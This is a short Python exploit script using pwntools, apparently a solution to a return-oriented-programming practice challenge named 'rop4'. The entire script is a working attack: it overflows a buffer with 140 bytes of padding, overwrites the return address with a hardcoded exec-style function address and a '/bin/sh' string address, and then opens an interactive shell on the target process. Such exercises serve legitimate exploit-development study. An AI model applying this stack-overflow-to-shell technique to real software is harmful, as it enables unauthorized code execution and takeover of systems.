from pwn import *
ov="a"*140
p=process("./rop4")
vul=0x08048F3B
exe=0x08053AB0
binsh=0x080CBF4F
pay=ov+p32(exe)+p32(0xdeadbeef)+p32(binsh)+p32(binsh)+p32(0x0)
p.sendline(pay)
p.interactive()
